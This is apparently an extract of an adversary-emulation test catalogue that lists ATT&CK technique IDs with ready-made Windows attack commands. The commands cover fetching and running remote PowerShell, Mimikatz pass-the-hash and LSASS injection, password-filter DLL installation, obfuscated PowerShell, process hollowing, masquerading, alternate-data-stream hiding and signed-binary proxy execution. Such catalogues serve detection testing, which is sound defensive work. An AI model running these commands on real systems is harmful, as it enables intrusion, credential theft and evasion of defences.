3489: [- name: WMI Win32_Product Class - Execute Local MSI file with embedded JScript] [attack_technique: T1218.007] [      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }]
3492: [- name: WMI Win32_Product Class - Execute Local MSI file with embedded VBScript] [attack_technique: T1218.007] [    command: |]
3493: [- name: WMI Win32_Product Class - Execute Local MSI file with embedded VBScript] [attack_technique: T1218.007] [      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }]
3496: [- name: WMI Win32_Product Class - Execute Local MSI file with an embedded DLL] [attack_technique: T1218.007] [    command: |]
3497: [- name: WMI Win32_Product Class - Execute Local MSI file with an embedded DLL] [attack_technique: T1218.007] [      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }]
3500: [- name: WMI Win32_Product Class - Execute Local MSI file with an embedded EXE] [attack_technique: T1218.007] [    command: |]
3501: [- name: WMI Win32_Product Class - Execute Local MSI file with an embedded EXE] [attack_technique: T1218.007] [      Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }]
3504: [- name: Msiexec.exe - Execute the DllRegisterServer function of a DLL] [attack_technique: T1218.007] [    command: |]
3505: [- name: Msiexec.exe - Execute the DllRegisterServer function of a DLL] [attack_technique: T1218.007] [      msiexec.exe /y "#{dll_payload}"]
3508: [- name: Msiexec.exe - Execute the DllUnregisterServer function of a DLL] [attack_technique: T1218.007] [    command: |]
3509: [- name: Msiexec.exe - Execute the DllUnregisterServer function of a DLL] [attack_technique: T1218.007] [      msiexec.exe /z "#{dll_payload}"]
3512: [- name: Msiexec.exe - Execute Remote MSI file] [attack_technique: T1218.007] [    command: |]
3513: [- name: Msiexec.exe - Execute Remote MSI file] [attack_technique: T1218.007] [      msiexec.exe /q /i "#{msi_payload}"]
3516: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [    command: |]
3517: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"]
3518: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe]
3519: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe]
3520: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt]
3521: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab]
3522: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe]
3523: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg]
3524: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey]
3525: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      expand \\webdav\folder\file.bat #{path}\file.txt:file.bat]
3526: [- name: Alternate Data Streams (ADS)] [attack_technique: T1564.004] [      esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o ]
3529: [- name: Store file in Alternate Data Stream (ADS)] [attack_technique: T1564.004] [    command: |]
3530: [- name: Store file in Alternate Data Stream (ADS)] [attack_technique: T1564.004] [      if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {]
3531: [- name: Store file in Alternate Data Stream (ADS)] [attack_technique: T1564.004] [          New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki]
3532: [- name: Store file in Alternate Data Stream (ADS)] [attack_technique: T1564.004] [          }]
3533: [- name: Store file in Alternate Data Stream (ADS)] [attack_technique: T1564.004] [      Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""]
3538: [- name: Create ADS command prompt] [attack_technique: T1564.004] [    command: |]
3539: [- name: Create ADS command prompt] [attack_technique: T1564.004] [      echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}]
3540: [- name: Create ADS command prompt] [attack_technique: T1564.004] [      for /f "usebackq delims=?" %i in (#{file_name}:#{ads_filename}) do %i]
3545: [- name: Create ADS PowerShell] [attack_technique: T1564.004] [    command: |]
3546: [- name: Create ADS PowerShell] [attack_technique: T1564.004] [      echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"]
3547: [- name: Create ADS PowerShell] [attack_technique: T1564.004] [      set-content -path #{file_name} -stream #{ads_filename} -value "test2"]
3548: [- name: Create ADS PowerShell] [attack_technique: T1564.004] [      set-content -path . -stream #{ads_filename} -value "test3"]
3553: [- name: Add Network Share] [attack_technique: T1070.005] [    command: |]
3554: [- name: Add Network Share] [attack_technique: T1070.005] [      net use c: #{share_name}]
3555: [- name: Add Network Share] [attack_technique: T1070.005] [      net share test=#{share_name} /REMARK:"test share" /CACHE:No]
3558: [- name: Remove Network Share] [attack_technique: T1070.005] [    command: |]
3559: [- name: Remove Network Share] [attack_technique: T1070.005] [      net share #{share_name} /delete]
3562: [- name: Remove Network Share PowerShell] [attack_technique: T1070.005] [    command: |]
3563: [- name: Remove Network Share PowerShell] [attack_technique: T1070.005] [      Remove-SmbShare -Name #{share_name}]
3564: [- name: Remove Network Share PowerShell] [attack_technique: T1070.005] [      Remove-FileShare -Name #{share_name}]
3567: [- name: Disable Administrative Share Creation at Startup] [attack_technique: T1070.005] [    command: |]
3568: [- name: Disable Administrative Share Creation at Startup] [attack_technique: T1070.005] [       reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f]
3569: [- name: Disable Administrative Share Creation at Startup] [attack_technique: T1070.005] [       reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f]
3575: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [    command: |]
3576: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [      $OriginalCommand = '#{powershell_command}']
3577: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)]
3578: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [      $EncodedCommand =[Convert]::ToBase64String($Bytes)]
3579: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [      $EncodedCommand]
3580: [- name: Execute base64-encoded PowerShell] [attack_technique: T1027] [      powershell.exe -EncodedCommand $EncodedCommand]
3583: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [    command: |]
3584: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      $OriginalCommand = '#{powershell_command}']
3585: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)]
3586: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      $EncodedCommand =[Convert]::ToBase64String($Bytes)]
3587: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      $EncodedCommand]
3588: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] []
3589: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand]
3590: [- name: Execute base64-encoded PowerShell from Windows Registry] [attack_technique: T1027] [      powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"]
3595: [- name: Execution from Compressed File] [attack_technique: T1027] [    command: |]
3596: [- name: Execution from Compressed File] [attack_technique: T1027] [      "%temp%\temp_T1027.zip\T1027.exe"]
3603: [- name: DLP Evasion via Sensitive Data in VBA Macro over email] [attack_technique: T1027] [    command: |]
3604: [- name: DLP Evasion via Sensitive Data in VBA Macro over email] [attack_technique: T1027] [      Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments #{input_file} -SmtpServer #{smtp_server}]
3607: [- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP] [attack_technique: T1027] [    command: |]
3608: [- name: DLP Evasion via Sensitive Data in VBA Macro over HTTP] [attack_technique: T1027] [      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}]
3611: [- name: Obfuscated Command in PowerShell] [attack_technique: T1027] [    command: |]
3612: [- name: Obfuscated Command in PowerShell] [attack_technique: T1027] [      $cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )]
3615: [- name: Odbcconf.exe - Execute Arbitrary DLL] [attack_technique: T1218.008] [    command: |]
3616: [- name: Odbcconf.exe - Execute Arbitrary DLL] [attack_technique: T1218.008] [      odbcconf.exe /S /A {REGSVR "#{dll_payload}"}]
3619: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [    command: |]
3620: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      . $PathToAtomicsFolder\T1134.004\src\PPID-Spoof.ps1]
3621: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      $ppid=Get-Process #{parent_process_name} | select -expand id]
3622: [- name: Parent PID Spoofing using PowerShell] [attack_technique: T1134.004] [      PPID-Spoof -ppid $ppid -spawnto "#{spawnto_process_path}" -dllpath "#{dll_path}"]
3628: [- name: Mimikatz Pass the Hash] [attack_technique: T1550.002] [    command: |]
3629: [- name: Mimikatz Pass the Hash] [attack_technique: T1550.002] [      #{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}"]
3632: [- name: crackmapexec Pass the Hash] [attack_technique: T1550.002] [    command: |]
3633: [- name: crackmapexec Pass the Hash] [attack_technique: T1550.002] [      #{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}]
3641: [- name: Mimikatz Kerberos Ticket Attack] [attack_technique: T1550.003] [    command: |]
3642: [- name: Mimikatz Kerberos Ticket Attack] [attack_technique: T1550.003] [      #{mimikatz_exe} "kerberos::ptt #{ticket}"]
3645: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [    command: |]
3646: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename]
3647: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"]
3648: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")]
3649: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      $notificationPackagesValues += $passwordFilterName]
3650: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues]
3651: [- name: Install and Register Password Filter DLL] [attack_technique: T1556.002] [      Restart-Computer -Confirm]
3654: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [    command: |]
3655: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\Program Files\windows_service.exe"]
3656: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      copy #{service_executable} "C:\program.exe"]
3657: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc create "Example Service" binpath= "C:\Program Files\windows_service.exe" Displayname= "Example Service" start= auto]
3658: [- name: Execution of program.exe as service with unquoted service path] [attack_technique: T1574.009] [      sc start "Example Service"]
3667: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [    command: |]
3668: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      . $PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1]
3669: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      $ppid=Get-Process #{parent_process_name} | select -expand id]
3670: [- name: Process Hollowing using PowerShell] [attack_technique: T1055.012] [      Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose]
3675: [- name: RunPE via VBA] [attack_technique: T1055.012] [    command: |]
3676: [- name: RunPE via VBA] [attack_technique: T1055.012] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
3677: [- name: RunPE via VBA] [attack_technique: T1055.012] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ]
3678: [- name: RunPE via VBA] [attack_technique: T1055.012] [      Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"]
3681: [- name: Shellcode execution via VBA] [attack_technique: T1055] [    command: |]
3682: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12]
3683: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)]
3684: [- name: Shellcode execution via VBA] [attack_technique: T1055] [      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"]
3687: [- name: Remote Process Injection in LSASS via mimikatz] [attack_technique: T1055] [    command: |]
3688: [- name: Remote Process Injection in LSASS via mimikatz] [attack_technique: T1055] [      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"]
3691: [- name: PubPrn.vbs Signed Script Bypass] [attack_technique: T1216.001] [    command: |]
3692: [- name: PubPrn.vbs Signed Script Bypass] [attack_technique: T1216.001] [      cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:#{remote_payload}"]
3701: [- name: Regasm Uninstall Method Call Test] [attack_technique: T1218.009] [    command: |]
3702: [- name: Regasm Uninstall Method Call Test] [attack_technique: T1218.009] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library #{source_file}]
3703: [- name: Regasm Uninstall Method Call Test] [attack_technique: T1218.009] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}]
3708: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [    command: |]
3709: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [      $key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=']
3710: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [      $Content = [System.Convert]::FromBase64String($key)]
3711: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [      Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte]
3712: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:"#{output_file}" /target:library /keyfile:$env:Temp\key.snk #{source_file}]
3713: [- name: Regsvcs Uninstall Method Call Test] [attack_technique: T1218.009] [      C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}]
3721: [- name: Regsvr32 local COM scriptlet execution] [attack_technique: T1218.010] [    command: |]
3722: [- name: Regsvr32 local COM scriptlet execution] [attack_technique: T1218.010] [      #{regsvr32path}\#{regsvr32name} /s /u /i:#{filename} scrobj.dll]
3725: [- name: Regsvr32 remote COM scriptlet execution] [attack_technique: T1218.010] [    command: |]
3726: [- name: Regsvr32 remote COM scriptlet execution] [attack_technique: T1218.010] [      #{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll]
3729: [- name: Regsvr32 local DLL execution] [attack_technique: T1218.010] [    command: |]
3730: [- name: Regsvr32 local DLL execution] [attack_technique: T1218.010] [      IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )]
3733: [- name: Regsvr32 Silent DLL Install Call DllRegisterServer] [attack_technique: T1218.010] [    command: |]
3734: [- name: Regsvr32 Silent DLL Install Call DllRegisterServer] [attack_technique: T1218.010] [      #{regsvr32path}\#{regsvr32name} /s #{dll_file}]
3762: [- name: Masquerading as Windows LSASS process] [attack_technique: T1036.003] [    command: |]
3763: [- name: Masquerading as Windows LSASS process] [attack_technique: T1036.003] [      copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe]
3764: [- name: Masquerading as Windows LSASS process] [attack_technique: T1036.003] [      %SystemRoot%\Temp\lsass.exe /B]
3769: [- name: Masquerading - cscript.exe running as notepad.exe] [attack_technique: T1036.003] [    command: |]
3770: [- name: Masquerading - cscript.exe running as notepad.exe] [attack_technique: T1036.003] [      copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y]
3771: [- name: Masquerading - cscript.exe running as notepad.exe] [attack_technique: T1036.003] [      cmd.exe /c %APPDATA%\notepad.exe /B]
3776: [- name: Masquerading - wscript.exe running as svchost.exe] [attack_technique: T1036.003] [    command: |]
3777: [- name: Masquerading - wscript.exe running as svchost.exe] [attack_technique: T1036.003] [      copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y]
3778: [- name: Masquerading - wscript.exe running as svchost.exe] [attack_technique: T1036.003] [      cmd.exe /c %APPDATA%\svchost.exe /B]
3783: [- name: Masquerading - powershell.exe running as taskhostw.exe] [attack_technique: T1036.003] [    command: |]
3784: [- name: Masquerading - powershell.exe running as taskhostw.exe] [attack_technique: T1036.003] [      copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y]
3785: [- name: Masquerading - powershell.exe running as taskhostw.exe] [attack_technique: T1036.003] [      cmd.exe /K %APPDATA%\taskhostw.exe]
3790: [- name: Masquerading - non-windows exe running as windows exe] [attack_technique: T1036.003] [    command: |]
3791: [- name: Masquerading - non-windows exe running as windows exe] [attack_technique: T1036.003] [      copy #{inputfile} #{outputfile}]
3792: [- name: Masquerading - non-windows exe running as windows exe] [attack_technique: T1036.003] [      $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id]
3793: [- name: Masquerading - non-windows exe running as windows exe] [attack_technique: T1036.003] [      Stop-Process -ID $myT1036_003]
3798: [- name: Masquerading - windows exe running as different windows exe] [attack_technique: T1036.003] [    command: |]
3799: [- name: Masquerading - windows exe running as different windows exe] [attack_technique: T1036.003] [      copy #{inputfile} #{outputfile}]
3800: [- name: Masquerading - windows exe running as different windows exe] [attack_technique: T1036.003] [      $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id]
3801: [- name: Masquerading - windows exe running as different windows exe] [attack_technique: T1036.003] [      Stop-Process -ID $myT1036_003]
3806: [- name: Malicious process Masquerading as LSM.exe] [attack_technique: T1036.003] [    command: |]
3807: [- name: Malicious process Masquerading as LSM.exe] [attack_technique: T1036.003] [      copy C:\Windows\System32\cmd.exe C:\lsm.exe]
3808: [- name: Malicious process Masquerading as LSM.exe] [attack_technique: T1036.003] [      C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt]
3814: [- name: File Extension Masquerading] [attack_technique: T1036.003] [    command: |]
3815: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{exe_path} %temp%\T1036.003_masquerading.docx.exe /Y]
3816: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{exe_path} %temp%\T1036.003_masquerading.pdf.exe /Y]
3817: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{exe_path} %temp%\T1036.003_masquerading.ps1.exe /Y]
3818: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{vbs_path} %temp%\T1036.003_masquerading.xls.vbs /Y]
3819: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{vbs_path} %temp%\T1036.003_masquerading.xlsx.vbs /Y]
3820: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{vbs_path} %temp%\T1036.003_masquerading.png.vbs /Y]
3821: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{ps1_path} %temp%\T1036.003_masquerading.doc.ps1 /Y]
3822: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{ps1_path} %temp%\T1036.003_masquerading.pdf.ps1 /Y]
3823: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      copy #{ps1_path} %temp%\T1036.003_masquerading.rtf.ps1 /Y]
3824: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.docx.exe]
3825: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.pdf.exe]
3826: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.ps1.exe]
3827: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.xls.vbs]
3828: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.xlsx.vbs]
3829: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      %temp%\T1036.003_masquerading.png.vbs]
3830: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1]
3831: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1]
3832: [- name: File Extension Masquerading] [attack_technique: T1036.003] [      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1]
3845: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [    command: |]
3846: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [      "C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver]
3847: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [      regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"]
3848: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [      rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"]
3849: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [      sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV]
3850: [- name: Register Portable Virtualbox] [attack_technique: T1564.006] [      sc start VBoxDRV]
3858: [- name: Create and start Hyper-V virtual machine] [attack_technique: T1564.006] [    command: |]
3859: [- name: Create and start Hyper-V virtual machine] [attack_technique: T1564.006] [      "#{vboxmanage_exe}" createvm --name "#{vm_name}" --register]
3860: [- name: Create and start Hyper-V virtual machine] [attack_technique: T1564.006] [      "#{vboxmanage_exe}" modifyvm "#{vm_name}" --firmware efi]
3861: [- name: Create and start Hyper-V virtual machine] [attack_technique: T1564.006] [      "#{vboxmanage_exe}" startvm "#{vm_name}"]
3888: [- name: Rundll32 execute JavaScript Remote Payload With GetObject] [attack_technique: T1218.011] [    command: |]
3889: [- name: Rundll32 execute JavaScript Remote Payload With GetObject] [attack_technique: T1218.011] [      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();]
3892: [- name: Rundll32 execute VBscript command] [attack_technique: T1218.011] [    command: |]
3893: [- name: Rundll32 execute VBscript command] [attack_technique: T1218.011] [      rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)]
3896: [- name: Rundll32 advpack.dll Execution] [attack_technique: T1218.011] [    command: |]
3897: [- name: Rundll32 advpack.dll Execution] [attack_technique: T1218.011] [      rundll32.exe advpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,]
3900: [- name: Rundll32 ieadvpack.dll Execution] [attack_technique: T1218.011] [    command: |]
3901: [- name: Rundll32 ieadvpack.dll Execution] [attack_technique: T1218.011] [      rundll32.exe ieadvpack.dll,LaunchINFSection #{inf_to_execute},DefaultInstall_SingleUser,1,]
3904: [- name: Rundll32 syssetup.dll Execution] [attack_technique: T1218.011] [    command: |]
3905: [- name: Rundll32 syssetup.dll Execution] [attack_technique: T1218.011] [      rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\#{inf_to_execute}]
3908: [- name: Rundll32 setupapi.dll Execution] [attack_technique: T1218.011] [    command: |]
3909: [- name: Rundll32 setupapi.dll Execution] [attack_technique: T1218.011] [      rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\#{inf_to_execute}]
3912: [- name: Execution of HTA and VBS Files using Rundll32 and URL.dll] [attack_technique: T1218.011] [    command: |]
3913: [- name: Execution of HTA and VBS Files using Rundll32 and URL.dll] [attack_technique: T1218.011] [      rundll32.exe url.dll,OpenURL PathToAtomicsFolder\T1218.011\src\index.hta]
3914: [- name: Execution of HTA and VBS Files using Rundll32 and URL.dll] [attack_technique: T1218.011] [      rundll32.exe URL.dll,FileProtocolHandler PathToAtomicsFolder\T1218.011\src\akteullen.vbs]
3917: [- name: Launches an executable using Rundll32 and pcwutl.dll] [attack_technique: T1218.011] [    command: |]
3918: [- name: Launches an executable using Rundll32 and pcwutl.dll] [attack_technique: T1218.011] [      rundll32.exe pcwutl.dll,LaunchApplication #{exe_to_launch}]
3979: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [    command: |]
3980: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL]
3981: [- name: Service Registry Permissions Weakness] [attack_technique: T1574.011] [      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL]
3984: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [    command: |]
3985: [- name: Service ImagePath Change with reg.exe] [attack_technique: T1574.011] [      reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /f /v ImagePath /d "#{malicious_service_path}"]
3990: [- name: mavinject - Inject DLL into running process] [attack_technique: T1218] [    command: |]
3991: [- name: mavinject - Inject DLL into running process] [attack_technique: T1218] [      mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}]
3994: [- name: SyncAppvPublishingServer - Execute arbitrary PowerShell code] [attack_technique: T1218] [    command: |]
3995: [- name: SyncAppvPublishingServer - Execute arbitrary PowerShell code] [attack_technique: T1218] [      SyncAppvPublishingServer.exe "n; #{powershell_code}"]
3998: [- name: Register-CimProvider - Execute evil dll] [attack_technique: T1218] [    command: |]
